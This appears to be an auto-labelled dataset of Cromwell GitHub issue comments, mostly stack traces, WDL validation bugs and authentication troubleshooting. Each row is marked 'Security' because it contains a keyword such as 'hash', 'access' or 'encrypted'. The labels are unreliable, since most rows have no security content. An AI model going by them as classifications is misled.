Security, | 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 11:09:46 cromwell-test_1 | 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 11:09:46 cromwell-test_1 | 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 11:09:46 cromwell-test_1 | 	at java.lang.Thread.run(Thread.java:748); 11:09:46 cromwell-test_1 | Caused by: java.lang.NullPointerException: null; 11:09:46 cromwell-test_1 | 	at liquibase.sqlgenerator.SqlGeneratorFactory.getGenerators(SqlGeneratorFactory.java:123); 11:09:46 cromwell-test_1 | 	at liquibase.sqlgenerator.SqlGeneratorFactory.createGeneratorChain(SqlGeneratorFactory.java:189); 11:09:46 cromwell-test_1 | 	at liquibase.sqlgenerator.SqlGeneratorFactory.generateSql(SqlGeneratorFactory.java:221); 11:09:46 cromwell-test_1 | 	at liquibase.executor.AbstractExecutor.applyVisitors(AbstractExecutor.java:25); 11:09:46 cromwell-test_1 | 	at liquibase.executor.jvm.JdbcExecutor.access$700(JdbcExecutor.java:36); 11:09:46 cromwell-test_1 | 	at liquibase.executor.jvm.JdbcExecutor$QueryStatementCallback.doInStatement(JdbcExecutor.java:338); 11:09:46 cromwell-test_1 | 	at liquibase.executor.jvm.JdbcExecutor.execute(JdbcExecutor.java:55); 11:09:46 cromwell-test_1 | 	at liquibase.executor.jvm.JdbcExecutor.query(JdbcExecutor.java:126); 11:09:46 cromwell-test_1 | 	at liquibase.executor.jvm.JdbcExecutor.query(JdbcExecutor.java:134); 11:09:46 cromwell-test_1 | 	at liquibase.executor.jvm.JdbcExecutor.queryForObject(JdbcExecutor.java:142); 11:09:46 cromwell-test_1 | 	at liquibase.executor.jvm.JdbcExecutor.queryForObject(JdbcExecutor.java:157); 11:09:46 cromwell-test_1 | 	at liquibase.executor.jvm.JdbcExecutor.queryForInt(JdbcExecutor.java:178); 11:09:46 cromwell-test_1 | 	at liquibase.executor.jvm.JdbcExecutor.queryForInt(JdbcExecutor.java:173); 11:09:46 cromwell-test_1 | 	at liquibase.snapshot.SnapshotGeneratorFactory.has(SnapshotGeneratorFactory.java:98); 11:09:46 cromwell-test_1 |,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4328#issuecomment-434037766:5813,access,access,5813,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4328#issuecomment-434037766,1,['access'],['access']
Security,![verbal reviewer](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ43keR0LMoYCkj3rvBJ-psREke9Dupmo0JiZjTZ0hBTZQlpW99JQ),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2511#issuecomment-320040669:27,encrypt,encrypted-,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2511#issuecomment-320040669,1,['encrypt'],['encrypted-']
Security,"""This is not deemed to be a critical issue (yet) from a security perspective"". however. ""we should make sure to clear this up when we get a chance""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4979#issuecomment-494152187:56,secur,security,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4979#issuecomment-494152187,2,['secur'],['security']
Security,"'main' (reason 1 of 1): Failed to process input declaration 'Directory d = ""/etc""' (reason 1 of 1): Cannot coerce expression of type 'String' to 'Directory'; ```; Despite [coercion](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#type-coercion) from `String` to `Directory` being allowed by the WDL specification and this being among the examples (see [here](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#task-inputs) and [here](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#primitive-types)). Surprisingly, you can coerce a `String` into a `Directory` if it comes from an input file:; ```; $ echo 'version development. workflow main {; input {; Directory d; }; }' > main.wdl. $ echo '{; ""main.d"": ""/etc""; }' > main.json; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl -i main.json; Success!; ```. Also puzzling is the following:; ```; $ echo 'version development. workflow main {; input {; Directory d; }; String s = sub(d, ""x"", ""y""); }' > main.wdl; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl; Failed to process workflow definition 'main' (reason 1 of 1): Failed to process declaration 'String s = sub(d, ""x"", ""y"")' (reason 1 of 1): Failed to process expression 'sub(d, ""x"", ""y"")' (reason 1 of 1): Invalid parameter 'IdentifierLookup(d)'. Expected 'File' but got 'Directory'; ```; First of all, it is unclear why womtool claims sub expects a `File`, as the definition of [sub](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#string-substring-string-string) is `String sub(String, String, String)` so `File` is not something that should be expected. Here it should be allowed to coerce `Directory` to `String` the same way as it is allowed to coerce `File` to `String`:; ```; $ echo 'version development. workflow main {; input {; File f; }; String s = sub(f, ""x"", ""y""); }' > main.wdl; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl; Success!; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6501#issuecomment-925057228:1346,validat,validate,1346,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6501#issuecomment-925057228,2,['validat'],['validate']
Security,") ~[cromwell.jar:0.19]; at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90) ~[cromwell.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[cromwell.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; ```. AND 8 instances of these:. ```; 2016-05-03 17:58:04,687 cromwell-system-akka.actor.default-dispatcher-18 INFO - JES Run [UUID(d3ba97c6):ValidateReadGroupSamFile:13]: Status change from Running to Success; 2016-05-03 17:58:04,820 cromwell-system-akka.actor.default-dispatcher-8 WARN - Caught exception, retrying: 504 Gateway Time-out; {; ""code"" : 504,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; com.google.api.client.googleapis.json.GoogleJsonResponseException: 504 Gateway Time-out; {; ""code"" : 504,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnEr",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:6621,Validat,ValidateReadGroupSamFile,6621,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,1,['Validat'],['ValidateReadGroupSamFile']
Security,); 	at cromwell.core.path.PathObjectMethods.hashCode$(PathObjectMethods.scala:18); 	at cromwell.filesystems.sra.SraPath.hashCode(SraPathBuilder.scala:26); 	at scala.runtime.Statics.anyHash(Statics.java:122); 	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:68); 	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:215); 	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:149); 	at cromwell.core.io.DefaultIoCommand$DefaultIoSizeCommand.hashCode(DefaultIoCommand.scala:14); 	at scala.runtime.Statics.anyHash(Statics.java:122); 	at scala.util.hashing.MurmurHash3.productHash(MurmurHash3.scala:68); 	at scala.util.hashing.MurmurHash3$.productHash(MurmurHash3.scala:215); 	at scala.runtime.ScalaRunTime$._hashCode(ScalaRunTime.scala:149); 	at cromwell.core.io.IoPromiseProxyActor$IoCommandWithPromise.hashCode(IoPromiseProxyActor.scala:11); 	at com.google.common.base.Equivalence$Equals.doHash(Equivalence.java:348); 	at com.google.common.base.Equivalence.hash(Equivalence.java:112); 	at com.google.common.cache.LocalCache.hash(LocalCache.java:1696); 	at com.google.common.cache.LocalCache.getIfPresent(LocalCache.java:3956); 	at com.google.common.cache.LocalCache$LocalManualCache.getIfPresent(LocalCache.java:4865); 	at cromwell.engine.io.IoActorProxy$$anonfun$receive$1.applyOrElse(IoActorProxy.scala:25); 	at akka.actor.Actor.aroundReceive(Actor.scala:539); 	at akka.actor.Actor.aroundReceive$(Actor.scala:537); 	at cromwell.engine.io.IoActorProxy.aroundReceive(IoActorProxy.scala:16); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:612); 	at akka.actor.ActorCell.invoke(ActorCell.scala:581); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:268); 	at akka.dispatch.Mailbox.run(Mailbox.scala:229); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:241); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.run,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679399680:1618,hash,hash,1618,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679399680,1,['hash'],['hash']
Security,"+1 for 1024. On Aug 17, 2016 5:09 PM, ""mcovarr"" notifications@github.com wrote:. > HASH_VALUE in CALL_CACHING_HASH is VARCHAR(255), so we shouldn't have; > this particular problem. But given that the Docker hashes we generate are; > functions of Docker image names and those seem to have the potential to be; > very long, we might want to think about an even larger field.; > ; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > https://github.com/broadinstitute/cromwell/issues/1301#issuecomment-240549174,; > or mute the thread; > https://github.com/notifications/unsubscribe-auth/ACDXkyM0b_81HFK68jJ5Hn71QHaO9qOwks5qg3h-gaJpZM4JmwYu; > .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1301#issuecomment-240592996:207,hash,hashes,207,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1301#issuecomment-240592996,1,['hash'],['hashes']
Security,- I don't think Cromwell had any opinions on where it gets called from (it's all stateless REST queries over HTTP) - could you give an example of what you're trying to do? ; - I've only ever seen `Access-Control-Allow-Origin` in reference to web browser behavior ; - Maybe you have something in front of Cromwell that's blocking you?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2824#issuecomment-342845454:197,Access,Access-Control-Allow-Origin,197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2824#issuecomment-342845454,1,['Access'],['Access-Control-Allow-Origin']
Security,"- I have a failing test case, so that's a pretty good place to start looking!; - One assumption I need to validate is that every CWL file has exactly one `Callable`:; ```; WomBundle(primaryCallable = Option(value), allCallables = Map.empty, typeAliases = Map.empty); ```; This is based on reading the CWL spec and the declaration; ```; type Cwl = Workflow :+: CommandLineTool :+: ExpressionTool :+: CNil; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4285#issuecomment-431882059:106,validat,validate,106,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4285#issuecomment-431882059,1,['validat'],['validate']
Security,- WA will receive a WdlSource in preStart will try to validate it.; - BA will receive a list of jobDescriptors and will try to validate runtime requirements.; - Needs to defined if the will be a MIM in validation state in WA.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/604#issuecomment-205881870:54,validat,validate,54,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/604#issuecomment-205881870,3,['validat'],"['validate', 'validation']"
Security,"- Yes, does use private docker hub credentials.; - I took defaults otherwise. This was working fine yesterday. Did I need to re-authenticate?. On Wed, Nov 2, 2016 at 9:55 AM, kcibul notifications@github.com wrote:. > What authentication mode are you running in (default credentials, service; > account or refresh token)? Does your config make use of private dockerhub; > credentials; > ; > I'm wondering why it's writing an authorization at all.; > ; > —; > You are receiving this because you authored the thread.; > Reply to this email directly, view it on GitHub; > https://github.com/broadinstitute/cromwell/issues/1644#issuecomment-257870895,; > or mute the thread; > https://github.com/notifications/unsubscribe-auth/ACDXk2yTbJKsspghDzPz2y5Tp7jKKmnNks5q6JY_gaJpZM4KnP3t; > . ## . Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 7003EB; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1644#issuecomment-257987410:128,authenticat,authenticate,128,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1644#issuecomment-257987410,3,"['authenticat', 'authoriz']","['authenticate', 'authentication', 'authorization']"
Security,"- [x] Perform OAuth authentication (via clicky buttons in swagger, gcloud on CLI); - [x] Register user in Sam; - [x] Submit workflow to Cromwell; - [x] Get final results from Cromwell for that workflow",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2598#issuecomment-331165701:20,authenticat,authentication,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2598#issuecomment-331165701,1,['authenticat'],['authentication']
Security,- throttling was on; - call cache hashing was done with file paths,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1489#issuecomment-249863978:34,hash,hashing,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1489#issuecomment-249863978,1,['hash'],['hashing']
Security,"-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/dstat.log.txt""; startTime: '2017-01-13T23:16:37.083751898Z'; - description: copied 0 file(s) to ""gs://fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-VEP_Task/df.log.txt""; startTime: '2017-01-13T23:20:40.785907191Z'; labels: {}; projectId: broad-firecloud-benchmark; request:; '@type': type.googleapis.com/google.genomics.v1alpha2.RunPipelineRequest; ephemeralPipeline:; docker:; cmd: /bin/bash /cromwell_root/exec.sh; imageName: broadinstitute/broadmutationcalling_beta:benchmark_1; inputParameters:; - name: __extra_config_gcs_path; - localCopy:; disk: local-disk; path: fc-58202a28-b82d-49da-a226-b9e14cf3c995/3a64e707-2544-409b-8a56-9a888840045d/CallingGroup_Workflow/04b3f189-18f3-47b3-972c-0e59d2a56174/call-GatherAndOncotate_Task/MuTect1.call_stats.vcf; name: mutectMergedRawVCF-0; - localCopy:; disk: local-disk; path: firecloud-tcga-open-access/tutorial/reference/my_dot_vep.zip; name: VEP_File-0; - localCopy:; disk: local-disk; path: exec.sh; name: exec; name: CallingGroup_Workflow; outputParameters:; - localCopy:; disk: local-disk; path: VEP_Task-rc.txt; name: VEP_Task-rc.txt; - localCopy:; disk: local-disk; path: dstat.log.txt; name: dstat.log.txt; - localCopy:; disk: local-disk; path: df.log.txt; name: df.log.txt; - localCopy:; disk: local-disk; path: variant_effect_output.txt; name: variant_effect_output.txt; - localCopy:; disk: local-disk; path: variant_effect_output.txt_summary.html; name: variant_effect_output.txt_summary.html; projectId: broad-firecloud-benchmark; resources:; bootDiskSizeGb: 10; disks:; - mountPoint: /cromwell_root; name: local-disk; sizeGb: 31; type: PERSISTENT_HDD; minimumCpuCores: 1; minimumRamGb: 7; zones:; - us-central1-b; - us-central1-c; - us-central1-f; pipelineArgs:; clientId: ''; inputs:; VEP_File-0: gs://firecloud-tcga-open-access/tutorial/reference/my_dot_",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1860#issuecomment-273271145:2823,access,access,2823,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1860#issuecomment-273271145,1,['access'],['access']
Security,"-akka.actor.default-dispatcher-10] [WorkflowActor(akka://test-system)] WorkflowActor [UUID(299b2fc4)]: persisting status of a to Running.; [INFO] [03/03/2016 23:43:32.134] [pool-7-thread-13-ScalaTest-running-CallCachingWorkflowSpec] [akka://test-system/user/$$h] WorkflowManagerActor submitWorkflow input id = None, effective id = c21e652b-b5f0-4435-a390-b1d61d1c9b4a; ```. Next it looks like a test is started up while pointing to the same in-memory db as this paused workflow. The paused workflow is interpreted as a workflow needing restart, so another concurrent copy is launched. . ```; [INFO] [03/03/2016 23:43:32.139] [ForkJoinPool-3-worker-3] [akka://test-system/user/$$h] WorkflowManagerActor Found 1 workflow to restart.; [INFO] [03/03/2016 23:43:32.139] [ForkJoinPool-3-worker-3] [akka://test-system/user/$$h] WorkflowManagerActor Restarting workflow ID: 299b2fc4-6a26-462f-96e3-1281f172d197; [INFO] [03/03/2016 23:43:32.152] [ForkJoinPool-3-worker-3] [akka://test-system/user/$$h] Invoking restartableWorkflow on 299b2fc4; [INFO] [03/03/2016 23:43:32.153] [ForkJoinPool-3-worker-3] [akka://test-system/user/$$h] WorkflowManagerActor submitWorkflow input id = Some(299b2fc4-6a26-462f-96e3-1281f172d197), effective id = 299b2fc4-6a26-462f-96e3-1281f172d197; ```. This quickly falls afoul of a uniqueness constraint:. ```; [ERROR] [03/03/2016 23:43:32.236] [ForkJoinPool-3-worker-1] [WorkflowActor(akka://test-system)] WorkflowActor [UUID(299b2fc4)]: Could not persist runtime attributes; java.sql.SQLIntegrityConstraintViolationException: integrity constraint violation: unique constraint or index violation; UK_RUNTIME_ATTRIBUTE table: RUNTIME_ATTRIBUTES; at org.hsqldb.jdbc.JDBCUtil.sqlException(Unknown Source); at org.hsqldb.jdbc.JDBCUtil.sqlException(Unknown Source); at org.hsqldb.jdbc.JDBCPreparedStatement.fetchResult(Unknown Source); at org.hsqldb.jdbc.JDBCPreparedStatement.executeUpdate(Unknown Source); ```. From that point on it's basically a trainwreck of tests cross-talking.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/502#issuecomment-192361344:3039,integrity,integrity,3039,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/502#issuecomment-192361344,2,['integrity'],['integrity']
Security,"-b7ba-416f-964e-22ab8c7b38e3; 2019-07-02 19:16:37,248 cromwell-system-akka.dispatchers.engine-dispatcher-31 INFO - Retrieved 1 workflows from the WorkflowStoreActor; 2019-07-02 19:16:37,271 cromwell-system-akka.dispatchers.engine-dispatcher-29 INFO - WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; 2019-07-02 19:16:37,932 cromwell-system-akka.dispatchers.engine-dispatcher-29 ERROR - Credentials are invalid: software.amazon.awssdk.http.SdkHttpService: Provider software.amazon.awssdk.http.apache.ApacheSdkHttpService not found; java.lang.RuntimeException: Credentials are invalid: software.amazon.awssdk.http.SdkHttpService: Provider software.amazon.awssdk.http.apache.ApacheSdkHttpService not found; 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential(AwsAuthMode.scala:85); 	at cromwell.cloudsupport.aws.auth.AwsAuthMode.validateCredential$(AwsAuthMode.scala:83); 	at cromwell.cloudsupport.aws.auth.DefaultMode.validateCredential(AwsAuthMode.scala:116); 	at cromwell.cloudsupport.aws.auth.DefaultMode._credential$lzycompute(AwsAuthMode.scala:127); 	at cromwell.cloudsupport.aws.auth.DefaultMode._credential(AwsAuthMode.scala:117); 	at cromwell.cloudsupport.aws.auth.DefaultMode.credential(AwsAuthMode.scala:130); 	at cromwell.filesystems.s3.S3PathBuilder$.fromAuthMode(S3PathBuilder.scala:118); 	at cromwell.filesystems.s3.S3PathBuilderFactory.withOptions(S3PathBuilderFactory.scala:59); 	at cromwell.core.path.PathBuilderFactory$.$anonfun$instantiatePathBuilders$2(PathBuilderFactory.scala:23); 	at cats.instances.ListInstances$$anon$1.$anonfun$traverse$2(list.scala:74); 	at cats.instances.ListInstances$$anon$1.loop$2(list.scala:64); 	at cats.instances.ListInstances$$anon$1.$anonfun$foldRight$1(list.scala:64); 	at cats.Eval$$anon$11.$anonfun$start$3(Eval.scala:275); 	at cats.Eval$.loop$1(Eval.scala:336); 	at cats.Eval$.cats$Eval$$evaluate(Eval.scala:368); 	at cats.Eval$Defer.value(Eval.scala:257); 	at cats.instances.Li",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:1809,validat,validateCredential,1809,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,1,['validat'],['validateCredential']
Security,.8.0_72]; at java.net.SocketOutputStream.write(SocketOutputStream.java:153) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.write(OutputRecord.java:417) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:717) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.sendChangeCipherSpec(Handshaker.java:1077) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.sendChangeCipherAndFinish(ClientHandshaker.java:1222) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.serverHelloDone(ClientHandshaker.java:1134) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:348) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.processLoop(Handshaker.java:979) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.process_record(Handshaker.java:914) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1062) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[na:1.8.0_72]; at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:153) ~[na:1.8.0_72]; at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:93) ~[cromwell.jar:0.19]; at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:972) ~[cromwell.jar:0.19]; at com.google.api.client.g,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:8276,secur,security,8276,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
Security,.WdlValue$class.computeHash(WdlValue.scala:63) ~[cromwell.jar:0.19]; at wdl4s.values.WdlSingleFile.computeHash(WdlFile.scala:39) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$8.apply(Backend.scala:193) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$8.apply(Backend.scala:193) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.mutable.ResizableArray$class.foreach(ResizableArray.scala:59) ~[cromwell.jar:0.19]; at scala.collection.mutable.ArrayBuffer.foreach(ArrayBuffer.scala:48) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$class.map(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$class.cromwell$engine$backend$Backend$$hashGivenDockerHash(Backend.scala:193) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$hash$3.apply(Backend.scala:214) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$hash$3.apply(Backend.scala:214) ~[cromwell.jar:0.19]; at scala.util.Success$$anonfun$map$1.apply(Try.scala:237) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at scala.util.Success.map(Try.scala:237) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$arou,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:3840,hash,hashGivenDockerHash,3840,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,1,['hash'],['hashGivenDockerHash']
Security,".invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [error] Read timed out; java.net.SocketTimeoutException: Read timed out; at java.net.SocketInputStream.socketRead0(Native Method); at java.net.SocketInputStream.socketRead(SocketInputStream.java:116); at java.net.SocketInputStream.read(SocketInputStream.java:170); at java.net.SocketInputStream.read(SocketInputStream.java:141); at sun.security.ssl.InputRecord.readFully(InputRecord.java:465); at sun.security.ssl.InputRecord.read(InputRecord.java:503); at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973); at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:930); at sun.security.ssl.AppInputStream.read(AppInputStream.java:105); at java.io.BufferedInputStream.fill(BufferedInputStream.java:246); at java.io.BufferedInputStream.read1(BufferedInputStream.java:286); at java.io.BufferedInputStream.read(BufferedInputStream.java:345); at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:704); at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:647); at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1536); at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1441); at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480); at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:338); at com.google.api.client.http.javanet.NetHttpResponse.<init>(NetHttpResponse.java:37); at com.google.api.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:2204,secur,security,2204,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['secur'],['security']
